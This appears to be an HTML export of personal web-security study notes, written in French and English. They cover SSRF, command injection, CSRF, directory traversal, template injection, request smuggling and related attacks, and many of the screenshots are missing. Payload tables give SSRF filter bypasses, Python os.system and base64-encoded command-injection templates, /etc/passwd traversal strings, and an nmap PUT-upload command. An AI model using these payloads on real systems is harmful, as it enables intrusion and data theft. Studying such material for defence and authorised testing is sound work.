<img src="images/image71.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>


<img src="images/image72.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Authentication :
<p>


<img src="images/image73.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>


<img src="images/image74.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul>
<p>

<img src="images/image75.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image76.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>(depending on the format of the request parameter)</strong>
</p>
<p>

<img src="images/image77.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image78.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image79.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image80.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image81.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>-------------------------------------------------------------------</strong>
</p>
<ul>

<li>Server-side request forgery (SSRF)
</li>
</ul>
<p>
<strong>Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests ( or other protocol ) to an arbitrary domain of the attacker's choosing.</strong>
</p>
<p>
<strong>In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems. </strong>
</p>
<p>
<strong>﻿A successful SSRF attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. </strong>
</p>
<p>
<strong>In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution. </strong>
</p>
<p>
<strong>	</strong>
</p>
<ul>

<li><strong>If the used API support open redirection via a parameter, you can try perform SSRF via this one ( to bypass the filter of the basic server ):</strong>
</li>
</ul>
<p>

<img src="images/image82.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>finding vuln
</li>
</ul>
<p>

<img src="images/image83.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h4>
               		Useful payloads</h4>



<table>
  <tr>
   <td><strong>http://localhost/...</strong>
   </td>
   <td><strong>Contre le serveur lui-même</strong>
   </td>
  </tr>
  <tr>
   <td><strong>2130706433</strong>
<p>
<strong>017700000001</strong>
<p>
<strong>127.1</strong>
<p>
<strong>127.0.1</strong>
<p>
<strong>evil.net</strong>
<p>
<strong>[0:0:0:0:ffff:127.0.0.1] ( use of Ipv6 format )</strong>
   </td>
   <td><strong>For bypass filter against this input 127.0.0.1</strong>
<p>
<strong>For evil.net, you can register your own domain name that resolves to 127.0.0.1</strong>
   </td>
  </tr>
  <tr>
   <td><strong>https://expected-host@﻿evil-host</strong>
<p>
<strong>https://﻿evil-host#expected-host</strong>
<p>
<strong>https://﻿[...]#@﻿[...]</strong>
<p>
<strong>https://﻿[...]@#﻿[...]</strong>
<p>
<strong>https://﻿evil-host?expected-host </strong>
   </td>
   <td><strong>Il se peut que evil-host soit pris en compte à la place expected-host dans ces exemples ( selon l'implémentation du traitement de la requête, quelles bibliothèques sont utilisées ).</strong>
   </td>
  </tr>
  <tr>
   <td><strong>https://expected-host:80:10101/</strong>
   </td>
   <td><strong>Selon l'implémentation du traitement de la requête, quelles bibliothèques sont utilisées, le port 80 peut être pris en compte ou l’autre.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Gopherus --exploit</strong>
   </td>
   <td><strong>Create payload ( Reverse shell or other ) for SSRF for different protocol et features ( smpt, redis, mongoDb, .. )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SSFRmap</strong>
   </td>
   <td><strong>Good tool for SSRF vulnerabilities ( svan port, files, …. )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>url=http://assets.pentesterlab.com.hackingwithpentesterlab.link/</strong>
   </td>
   <td><strong>In this example, the developer blocked everything that doesn't match assets.pentesterlab.com.</strong>
<p>
<strong>But We setup a special DNS zone that will always answer 127.0.0.1 for any host in the domain hackingwithpentesterlab.link.</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>Os command injection
</li>
</ul>
<p>

<img src="images/image84.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image85.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image86.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image87.png" width="" alt="alt_text" title="image_tooltip">

<img src="images/image88.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h4>Some payload</h4>



<table>
  <tr>
   <td><strong>__import__('os').system([CMD])</strong>
   </td>
   <td><strong>Python context code when the module os is not loaded</strong>
   </td>
  </tr>
  <tr>
   <td><strong>str(__import__('os').popen(__import__('base64').b64decode([CMD_ENCODED_B64])).read())</strong>
   </td>
   <td><strong>Python context code when the module os is not loaded, bypassing WAF with base64 encoding</strong>
   </td>
  </tr>
  <tr>
   <td><strong>“.`[CMD]`.”</strong>
   </td>
   <td><strong>Perl context</strong>
   </td>
  </tr>
  <tr>
   <td><strong>$([CMD])</strong>
   </td>
   <td><strong>Linux system  context</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>
<strong>-------------------------------------------------------------------</strong>
</p>
<ul>

<li>Cross-site request forgery (CSRF)
</li>
</ul>
<ul>

<li>
Definiton
<p>
<strong>Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.</strong>
</p>
<p>

<img src="images/image89.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image90.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Preventing
</li>
</ul>
</li>
</ul>
<p>

<img src="images/image91.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image92.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image93.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image94.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Quelques tactiques pour se protéger contre CSRF:</strong>
</p>
<ul>

<li><strong>Utiliser l'entête Referer or Origin pour examiner la provenance d’une requête (pour vérifier par exemple si une requête de changement de mot passe provient bien de la page web auquel on accède pour changer de mot de passe). Cette méthode est bypassable.</strong>
</li>
</ul>
<p>

<img src="images/image95.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image96.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>On peut utiliser la fonction javascript history.pushState() ( <em>method to add a state to the browser's session history stack.</em> ) pour modifier le Referer et concaténer un domaine autorisé : history.pushState("", "", "/?[DOMAINE AUTORISÉ]").</strong>
</p>
<ul>

<li><strong>Utiliser demande de confirmation par une pop-up, écriture d’un mot de passe, ou un captcha pour confirmer l’action demandée.</strong>
<ul>

<li><strong>Modify the name of the parameters of the POST or GET request</strong>
</li>
</ul>
</li>
</ul>
<p>

<img src="images/image97.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>( Using to tool )</strong>
</p>
<ul>

<li>Exploit techniques
</li>
</ul>
<p>

<img src="images/image98.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image99.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image100.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image101.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image102.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image103.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>( Using Json as part of the POST data )</strong>
</p>
<p>
<strong>enctype : change the Content-type.</strong>
</p>
<p>
<strong>example :</strong>
</p>
<p>

<img src="images/image104.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image105.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Business logic vulnerabilities
</li>
</ul>
<p>

<img src="images/image106.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>The associated vulnerabilities are also known as "application logic vulnerabilities" or simply "logic flaws". </strong>
</p>
<p>

<img src="images/image107.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image108.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image109.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image110.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Directory traversal
</li>
</ul>
<h4>Some interesting payloads</h4>



<table>
  <tr>
   <td><strong>/etc/passwd</strong>
   </td>
   <td><strong>If an application strips or blocks directory traversal sequences from the user-supplied filename, you might be able to use an absolute path from the filesystem root, such as filename=/etc/passwd, to directly reference a file without using any traversal sequences. </strong>
   </td>
  </tr>
  <tr>
   <td><strong>/....//....//....//etc/passwd</strong>
<p>
<strong>/....\/....\/....//etc/passwd ( windows )</strong>
   </td>
   <td><strong>You might be able to use nested traversal sequences, such as ....// or ....\/, which will revert to simple traversal sequences when the inner sequence is stripped. </strong>
   </td>
  </tr>
  <tr>
   <td><strong>﻿..%252f﻿..%252f﻿..%252fetc/passwd</strong>
   </td>
   <td><strong>DoubleURL encode</strong>
   </td>
  </tr>
  <tr>
   <td><strong>/file.php?file=/../../../../../../../pentesterlab.key%00</strong>
   </td>
   <td><strong>Null byte added</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>

<img src="images/image111.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>You can convert the path provided to an absolute path ( without “..” ) and then check.</strong>
</li>
</ul>
<ul>

<li>Web cache poisoning
</li>
</ul>
<p>

<img src="images/image112.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image113.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>How to prevent from Cache Poisoning?</strong>
</p>
<ul>

<li><strong>You must review the caching configuration of your caching server to ensure that when calculating cache keys it is avoiding to make any cache key decisions using untrusted user inputs</strong>
</li>
</ul>
<p>

<img src="images/image114.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image115.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Access Control
</li>
</ul>
<p>

<img src="images/image116.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image117.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Cross-origin resource sharing (CORS)
</li>
</ul>
<ul>

<li>
Definition
<p>
<strong>Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain.</strong>
</p>
<p>
<strong>It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain based attacks, if a website's CORS policy is poorly configured and implemented.</strong>
</p>
<p>

<img src="images/image118.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image119.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image120.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image121.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image122.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image123.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>SOP does not prevent sending requests. It does prevent a page from accessing results of cross-domain requests.</strong>
</p>
<ul>

<li><strong>Pre-flight checks :</strong>
</li>
</ul>
</li>
</ul>
<p>
<strong>The pre-flight check was added to the CORS specification to protect legacy </strong>
</p>
<p>
<strong>resources from the expanded request options allowed by CORS. </strong>
</p>
<p>

<img src="images/image124.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Exploit 
<p>

    Voir Section <em><span style="text-decoration:underline;">BB - CORS</span></em>
</p>
<ul>

<li>Server-side template injection
</li>
</ul>
</li>
</ul>
<ul>

<li>
Définition
<p>
Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. 
</p>
<p>
This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server. 
</p>
<p>
<strong>As the name suggests, server-side template injection payloads are delivered and evaluated server-side, potentially making them much more dangerous than a typical client-side template injection. </strong>
</p>
<p>

<img src="images/image125.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image126.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image127.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Detect
</li>
</ul>
</li>
</ul>
<p>

<img src="images/image128.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image129.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image130.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image131.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Identify
</li>
</ul>
<p>

<img src="images/image132.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image133.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Once you discover a server-side template injection vulnerability, and identify the template engine being used, unless you already know the template engine inside out, reading its documentation is usually the first place to start.</strong>
</p>
<p>
<strong>While this may not be the most exciting way to spend your time, it is important not to underestimate what a useful source of information the documentation can be. </strong>
</p>
<ul>

<li>Explore
</li>
</ul>
<p>

<img src="images/image134.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>It is important to note that websites will contain both built-in objects provided by the template and custom, site-specific objects that have been supplied by the web developer. You should pay particular attention to these non-standard objects because they are especially likely to contain sensitive information or exploitable methods.</strong>
</p>
<p>
<strong>The first step is to identify objects and methods to which you have access.</strong>
</p>
<p>
<strong>You should proceed by reviewing each function for exploitable behavior. By working methodically through this process, you may sometimes be able to construct a complex attack that is even able to exploit more secure targets.</strong>
</p>
<p>

<img src="images/image135.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Preventing
</li>
</ul>
<p>

<img src="images/image136.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>You can test SSTI in a webpage like you test an XSS. ( information reflected on the page )</strong>
</li>
</ul>
<p>
<strong>-------------------------------------------------------------------</strong>
</p>
<ul>

<li>HTTP Parameter Pollution
<p>

    <strong>HTTP Parameter Pollution (HPP) is a Web attack evasion technique that allows an attacker to craft a HTTP request in order to manipulate or retrieve hidden information. This evasion technique is based on splitting an attack vector between multiple instances of a parameter with the same name.</strong>
</p>
</li>
</ul>
<p>

    <strong>Since none of the relevant HTTP RFCs define the semantics of HTTP parameter manipulation, each web application delivery platform may deal with it differently. In particular, some environments process such requests by concatenating the values taken from all instances of a parameter name within the request.</strong>
</p>
<p>

    <strong>Example with SQLI :</strong>
</p>
<p>

    <strong>	https://www.xxx.com/noticias.php?id=1 union select 1,2 --</strong>
</p>
<p>

    <strong>	become :</strong>
</p>
<p>

        <strong>	https://www.xxx.com/noticias.php?id=1&id=*/union/*&id=*/select/*&id=*/1,2+--+</strong>
</p>
<ul>

<li><strong>De manière générale, il est important de regarder si on peut découvrir le format du cookie de session pour analyser si on peut en créer un autre valide “à la main” pour se faire passer pour quelqu’un d’autre.</strong>
</li>
</ul>
<h3>
                Différents Entêtes HTTP</h3>



<table>
  <tr>
   <td><strong>Content-Length</strong>
   </td>
   <td><strong>Indique la taille en octets (exprimée en base 10) du corps de la réponse envoyée au client.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Content-Type</strong>
   </td>
   <td><strong>Sert à indiquer le type de la ressource ( dans le body )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Host</strong>
   </td>
   <td><strong>L'en-tête de requête Host spécifie le nom de domaine du serveur (pour de l'hébergement virtuel), et (optionnellement) le numéro du port TCP sur lequel le serveur écoute. </strong>
   </td>
  </tr>
  <tr>
   <td><strong>X-Powered-By</strong>
   </td>
   <td><strong>Specifies the technology (e.g. ASP.NET, PHP, JBoss) supporting the web application (version details are often in X-Runtime, X-Version, or X-AspNet-Version)</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Referer</strong>
   </td>
   <td><strong>This header identifies the address of the webpage which is linked to the resource being requested. By checking the “Referer”, the new webpage can see where the request originated.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>X-Forwarded-For: &lt;client>, &lt;proxy1>, &lt;proxy2></strong>
   </td>
   <td><strong>Le champ d'en-tête HTTP X-Forwarded-For est une méthode courante pour identifier l'adresse IP d'origine d'un client se connectant à un serveur Web via un proxy HTTP ou un autre chose.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Location</strong>
   </td>
   <td><strong>header de redirection</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Vary</strong>
   </td>
   <td><strong>en tête par rapport à la mise en cache</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Connection</strong>
   </td>
   <td><strong>Contrôle la façon dont la connexion reste ouverte ou non après que la transaction courante soit terminée. Si la valeur envoyée est keep-alive, la connexion est persistante et n'est pas fermée.</strong>
<p>
<strong>Close : indique que le client ou que le serveur souhaite fermer la connexion. C'est la valeur par défaut pour les requêtes en HTTP/1.0.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>X-Content-Type-Options</strong>
   </td>
   <td><strong>It’s used to protect against MIME sniffing vulnerabilities.</strong>
<p>
<strong>This header is currently only honoured by Chrome and certain versions of Internet Explorer</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Pragma: no-cache</strong>
   </td>
   <td><strong>Vide le cache du reverse proxy</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>MIME sniffing
<ul>

<li><strong>MIME sniffing is a technique ( not malicious ) used by some web browsers (primarily Internet Explorer) to examine the content of a particular asset. This is done for the purpose of determining an asset's file format. </strong>
<p>

    
<img src="images/image137.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul>
</li>
</ul>
<p>
<strong>In summary, although MIME sniffing can be a useful feature provided by </strong>
</p>
<p>
<strong>web browsers can also cause security issues.</strong>
</p>
<ul>

<li>
Exploiting PUT Method 
<ul>
 
<li><strong>PUT method was originally intended as one of the HTTP methods used for file management operations. </strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>As this method is used to change or delete the files from the target server’s file system, it often results in arising in various File upload vulnerabilities.</strong>
</li>
</ul>
<ul>

<li><strong>First, we have to determine if the HTTP PUT method is enabled on the server ( by some tools like Nikito …). Note that permissions are likely to be implemented per directory, so recursive checking is required in an attack. Tools such as DAVTest can be used to iteratively check all directories on the server for the PUT method.</strong>
</li>
</ul>
<p>

<img src="images/image138.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>If this method is enabled, we can try different tools and techniques </strong>

<li>With Cadaver 
</li>
</ul>
<p>

<img src="images/image139.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>With Nmap
</li>
</ul>
<p>

<img src="images/image140.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>An example with this command :</strong>
</p>
<p>
<strong>nmap -p 80 192.168.1.103 --script http-put --script-args http-put.url='/dav/nmap.php',http-put.file='/root/Desktop/nmap.php'</strong>
</p>
<p>

<img src="images/image141.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>With Burp-Suite
</li>
</ul>
<p>

<img src="images/image142.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image143.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image144.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Finding PUT Method vuln
</li>
</ul>
<p>

<img src="images/image145.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image146.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>HTTP Host header attacks
<ul>

<li>Definition
</li>
</ul>
</li>
</ul>
<p>

<img src="images/image147.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>The purpose of the HTTP Host header is to help identify which back-end component the client wants to communicate with. If requests didn't contain Host headers, or if the Host header was malformed in some way, this could lead to issues when routing incoming requests to the intended application.</strong>
</p>
<p>
<strong>Historically, this ambiguity didn't exist because each IP address would only host content for a single domain. </strong>
</p>
<p>
<strong>Nowadays, it is common for multiple websites and applications to be accessible at the same IP address.</strong>
</p>
<p>
<strong>When multiple applications are accessible via the same IP address, this is most commonly a result of one of the following scenarios :</strong>
</p>
<ol>

<li><strong>Virtual Hosting</strong>
</li>
</ol>
<p>

<img src="images/image148.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>2) Routing traffic via an intermediary</strong>
</p>
<p>
<strong>Another common scenario is when websites are hosted on distinct back-end servers, but all traffic between the client and servers is routed through an intermediary system. </strong>
</p>
<p>
<strong>This could be a simple load balancer or a reverse proxy server of some kind.</strong>
</p>
<p>
<strong>In this case, even though the websites are hosted on separate back-end servers, all of their domain names resolve to a single IP address of the intermediary component.</strong>
</p>
<p>
<strong>How does the HTTP Host header solve this problem?</strong>
</p>
<p>
<strong>When a browser sends the request, the target URL will resolve to the IP address of a particular server. When this server receives the request, it refers to the Host header to determine the intended back-end and forwards the request accordingly.</strong>
</p>
<p>

<img src="images/image149.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Prévention
</li>
</ul>
<p>

<img src="images/image150.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h4>Test HTTP Host header attack :</h4>


<p>
<strong>When probing for Host header injection vulnerabilities, the first step is to test what happens when you supply an arbitrary, unrecognized domain name via the Host header.</strong>
</p>
<p>
<strong>Some intercepting proxies derive the target IP address from the Host header directly, which makes this kind of testing all but impossible; any changes you made to the header would just cause the request to be sent to a completely different IP address.</strong>
</p>
<p>
<strong>Sometimes, you will still be able to access the target website even when you supply an unexpected Host header. This could be for a number of reasons.</strong>
</p>
<p>
<strong>For example, servers are sometimes configured with a default or fallback option in case they receive requests for domain names that they don't recognize.</strong>
</p>
<p>

<img src="images/image151.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image152.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image153.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image154.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image155.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Add line wrapping</strong>
</p>
<p>
<strong>You can also uncover quirky behavior by indenting HTTP headers with a space character :</strong>
</p>
<p>

<img src="images/image156.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>The website may block requests with multiple Host headers, but you may be able to bypass this validation by indenting one of them like this.</strong>
</p>
<p>
<strong>The back-end may ignore the leading space and gives precedence to the first header in the case of duplicates.</strong>
</p>
<p>
<strong>There are many possible ways to issue harmful, ambiguous requests. You can also adapt many HTTP request smuggling techniques to construct Host header attacks.</strong>
</p>
<p>

<img src="images/image157.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>From a security perspective, it is important to note that some websites, potentially even your own, support this kind of behavior unintentionally. This is usually because one or more of these headers is enabled by default in some third-party technology that they use.</strong>
</p>
<ul>

<li>Password reset poisoning :
</li>
</ul>
<p>

<img src="images/image158.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image159.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image160.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image161.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image162.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>HTTP request smuggling
<ul>

<li>Definition
<p>

    <strong>HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.</strong>
</p>
</li>
</ul>
</li>
</ul>
<p>

<img src="images/image163.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection, because this is much more efficient and performant. </strong>
</p>
<p>
<strong>The protocol is very simple: HTTP requests are sent one after another, and the receiving server parses the HTTP request headers to determine where one request ends and the next one begins.</strong>
</p>
<p>

<img src="images/image164.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image165.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image166.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image167.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image168.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Since the HTTP specification provides two different methods for specifying the length of HTTP messages, it is possible for a single message to use both methods at once, such that they conflict with each other. </strong>
</p>
<p>
<strong>The HTTP specification attempts to prevent this problem by stating that if both the Content-Length and Transfer-Encoding headers are present, then the Content-Length header should be ignored. </strong>
</p>
<p>
<strong>This might be sufficient to avoid ambiguity when only a single server is in play, but not when two or more servers are chained together. In this situation, problems can arise for two reasons :</strong>
</p>
<p>
<strong>Some servers do not support the Transfer-Encoding header in requests.</strong>
</p>
<p>
<strong>Some servers that do support the Transfer-Encoding header can be induced not to process it the header is obfuscated in some way.</strong>
</p>
<p>
<strong>If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) Transfer-Encoding header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities. </strong>
</p>
<p>

<img src="images/image169.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>CL.TE vuln
</li>
</ul>
<p>

<img src="images/image170.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>TE.CL vuln
</li>
</ul>
<p>

<img src="images/image171.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>TE.TE vuln
</li>
</ul>
<p>

<img src="images/image172.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Prevention
</li>
</ul>
<p>

<img src="images/image173.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Finding CL.TE vuln
</li>
</ul>
<p>

<img src="images/image174.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image175.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Finding TE.CL vuln
</li>
</ul>
<p>

<img src="images/image176.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image177.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>IDOR ( Insecure Direct object Reference )
<p>

    <strong>Insecure Direct Object Reference represents a vulnerable Direct Object Reference. It involves replacing the entity name with a different value without the user’s authorization. As a result, users will be directed to links, pages, or sites other than the ones they intended to visit, without having the slightest clue about it.</strong>
</p>
</li>
</ul>
<p>

    <strong>Preventing IDOR Vulnerability :</strong>
</p>
<ul>

<li><strong>Use an Indirect Reference Map (  mapping between the alternate IDs and actual references are maintained safely on the servers ).</strong>
<p>

        <strong>Note that some sources recommend preventing IDOR vulnerabilities by using long, hard-to-guess object identifiers.</strong>
</p>
<ul>

<li>OAuth 2.0 authentication vulnerabilities
<h4>
    What is OAuth ?</h4>


<p>

    <strong>OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user's account on another application. </strong>
</p>
<p>

    <strong>You've almost certainly come across sites that let you log in using your social media account.</strong>
</p>
<p>

    <strong>Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application. </strong>
</p>
<h4>
    How does OAuth 2.0 Work ?</h4>


</li>
</ul>
</li>
</ul>
<p>
<strong>	</strong>
<img src="images/image178.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

    <strong>There are numerous different ways that the actual OAuth process can be implemented. In this topic, we'll focus on the "authorization code" and "implicit" grant types as these are by far the most common. </strong>
</p>
<p>

<img src="images/image179.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

    <strong>There are several different grant types, each with varying levels of complexity and security considerations.</strong>
</p>
<p>
<strong>	</strong>
</p>
<p>
<strong>	Fore more details : <a href="https://portswigger.net/web-security/oauth/grant-types">https://portswigger.net/web-security/oauth/grant-types</a></strong>
</p>
<p>

    <strong>Grant types are often referred to as "OAuth flows". </strong>
</p>
<p>

    <strong>example : </strong>
</p>
<p>

<img src="images/image180.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

    <strong>For basic OAuth, the scopes for which a client application can request access are unique to each OAuth service. </strong>
</p>
<p>
<strong>“Authorization code” grant type</strong>
</p>
<p>

<img src="images/image181.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Other better view :</strong>
</p>
<p>


<img src="images/image182.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

